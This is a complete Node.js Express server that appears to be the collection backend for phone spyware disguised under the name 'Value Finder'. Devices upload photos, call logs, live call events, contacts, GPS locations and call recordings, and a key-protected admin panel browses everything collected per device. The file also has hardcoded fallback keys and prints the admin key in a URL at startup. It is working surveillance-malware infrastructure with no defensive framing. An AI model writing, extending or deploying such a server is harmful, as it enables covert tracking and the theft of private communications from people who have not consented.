const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { db, UPLOAD_DIR } = require('./db');

const app = express();
const PORT = process.env.PORT || 3000;

// ═══════════════════════════════════════════
//  EDIT THESE BEFORE DEPLOY
// ═══════════════════════════════════════════
const API_KEY   = process.env.API_KEY   || 'vf_a7f3c91b2e6d8405a1c9e2f4b8d6a3c7';
const ADMIN_KEY = process.env.ADMIN_KEY || 'admin_secret_change_me';
// ═══════════════════════════════════════════

app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ extended: true, limit: '20mb' }));

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOAD_DIR),
  filename: (req, file, cb) => {
    const id = crypto.randomBytes(8).toString('hex');
    cb(null, `${Date.now()}_${id}_${file.originalname.replace(/[^\w.\-]/g, '_')}`);
  }
});
const upload = multer({ storage, limits: { fileSize: 500 * 1024 * 1024 } });

function deviceAuth(req, res, next) {
  if (req.header('X-Api-Key') !== API_KEY)
    return res.status(401).json({ error: 'bad key' });
  next();
}
function adminAuth(req, res, next) {
  const k = req.header('X-Admin-Key') || req.query.key;
  if (k !== ADMIN_KEY) return res.status(401).send('unauthorized');
  next();
}

app.get('/health', (req, res) => res.json({ ok: true, ts: Date.now() }));

app.post('/api/register', deviceAuth, (req, res) => {
  const { id, label, model, sdk } = req.body;
  const now = Date.now();
  db.prepare(`INSERT INTO devices (id,label,model,sdk,last_seen,created)
    VALUES (?,?,?,?,?,?) ON CONFLICT(id) DO UPDATE SET
    label=excluded.label, model=excluded.model, sdk=excluded.sdk,
    last_seen=excluded.last_seen`).run(id, label, model, sdk, now, now);
  res.json({ ok: true });
});

app.post('/api/photo', deviceAuth, upload.single('file'), (req, res) => {
  const { deviceId, ts } = req.body;
  const f = req.file;
  if (!f) return res.status(400).json({ error: 'no file' });
  db.prepare(`INSERT INTO photos (device_id,filename,path,size,ts,created)
    VALUES (?,?,?,?,?,?)`).run(deviceId, f.originalname, f.filename, f.size,
    +ts || Date.now(), Date.now());
  res.json({ ok: true });
});

app.post('/api/calls', deviceAuth, (req, res) => {
  const { deviceId, calls } = req.body;
  if (!Array.isArray(calls)) return res.json({ ok: true, count: 0 });
  const stmt = db.prepare(`INSERT INTO calls
    (device_id,number,name,type,duration,date,created) VALUES (?,?,?,?,?,?,?)`);
  db.transaction(l => {
    for (const c of l) stmt.run(deviceId, c.number, c.name || '', c.type,
      c.duration, c.date, Date.now());
  })(calls);
  res.json({ ok: true, count: calls.length });
});

app.post('/api/call-event', deviceAuth, (req, res) => {
  const { deviceId, number, duration, ts } = req.body;
  db.prepare(`INSERT INTO call_events (device_id,number,duration,ts)
    VALUES (?,?,?,?)`).run(deviceId, number || '', duration || 0, ts || Date.now());
  res.json({ ok: true });
});

app.post('/api/contacts', deviceAuth, (req, res) => {
  const { deviceId, contacts } = req.body;
  if (!Array.isArray(contacts)) return res.json({ ok: true, count: 0 });
  db.prepare('DELETE FROM contacts WHERE device_id = ?').run(deviceId);
  const stmt = db.prepare(`INSERT INTO contacts (device_id,name,number,created)
    VALUES (?,?,?,?)`);
  db.transaction(l => {
    for (const c of l) stmt.run(deviceId, c.name, c.number, Date.now());
  })(contacts);
  res.json({ ok: true, count: contacts.length });
});

app.post('/api/location', deviceAuth, (req, res) => {
  const { deviceId, lat, lon, accuracy, ts } = req.body;
  db.prepare(`INSERT INTO locations (device_id,lat,lon,accuracy,ts)
    VALUES (?,?,?,?,?)`).run(deviceId, lat, lon, accuracy, ts || Date.now());
  db.prepare('UPDATE devices SET last_seen = ? WHERE id = ?')
    .run(Date.now(), deviceId);
  res.json({ ok: true });
});

app.post('/api/recording', deviceAuth, upload.single('file'), (req, res) => {
  const { deviceId, number, duration } = req.body;
  const f = req.file;
  if (!f) return res.status(400).json({ error: 'no file' });
  db.prepare(`INSERT INTO recordings
    (device_id,number,duration,filename,path,ts) VALUES (?,?,?,?,?,?)`)
    .run(deviceId, number || '', +duration || 0, f.originalname, f.filename, Date.now());
  res.json({ ok: true });
});

app.get('/api/admin/devices', adminAuth, (req, res) => {
  res.json(db.prepare('SELECT * FROM devices ORDER BY last_seen DESC').all());
});

app.get('/api/admin/device/:id', adminAuth, (req, res) => {
  const id = req.params.id;
  res.json({
    device: db.prepare('SELECT * FROM devices WHERE id = ?').get(id),
    stats: {
      photos: db.prepare('SELECT COUNT(*) c FROM photos WHERE device_id=?').get(id).c,
      calls: db.prepare('SELECT COUNT(*) c FROM calls WHERE device_id=?').get(id).c,
      contacts: db.prepare('SELECT COUNT(*) c FROM contacts WHERE device_id=?').get(id).c,
      locations: db.prepare('SELECT COUNT(*) c FROM locations WHERE device_id=?').get(id).c,
      recordings: db.prepare('SELECT COUNT(*) c FROM recordings WHERE device_id=?').get(id).c,
      call_events: db.prepare('SELECT COUNT(*) c FROM call_events WHERE device_id=?').get(id).c,
    }
  });
});

app.get('/api/admin/device/:id/photos', adminAuth, (req, res) => {
  res.json(db.prepare('SELECT id,filename,size,ts FROM photos WHERE device_id=? ORDER BY ts DESC LIMIT 500').all(req.params.id));
});
app.get('/api/admin/device/:id/calls', adminAuth, (req, res) => {
  res.json(db.prepare('SELECT * FROM calls WHERE device_id=? ORDER BY date DESC LIMIT 500').all(req.params.id));
});
app.get('/api/admin/device/:id/call-events', adminAuth, (req, res) => {
  res.json(db.prepare('SELECT * FROM call_events WHERE device_id=? ORDER BY ts DESC LIMIT 500').all(req.params.id));
});
app.get('/api/admin/device/:id/contacts', adminAuth, (req, res) => {
  res.json(db.prepare('SELECT * FROM contacts WHERE device_id=? ORDER BY name ASC LIMIT 2000').all(req.params.id));
});
app.get('/api/admin/device/:id/locations', adminAuth, (req, res) => {
  res.json(db.prepare('SELECT * FROM locations WHERE device_id=? ORDER BY ts DESC LIMIT 500').all(req.params.id));
});
app.get('/api/admin/device/:id/recordings', adminAuth, (req, res) => {
  res.json(db.prepare('SELECT * FROM recordings WHERE device_id=? ORDER BY ts DESC LIMIT 200').all(req.params.id));
});

app.get('/files/:filename', adminAuth, (req, res) => {
  const p = path.join(UPLOAD_DIR, req.params.filename);
  if (!p.startsWith(UPLOAD_DIR)) return res.status(400).end();
  if (!fs.existsSync(p)) return res.status(404).end();
  res.sendFile(p);
});

app.use('/', adminAuth, express.static(path.join(__dirname, 'public')));

app.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('  Value Finder server running');
  console.log(`  Admin:  http://localhost:${PORT}/?key=${ADMIN_KEY}`);
  console.log('');
});
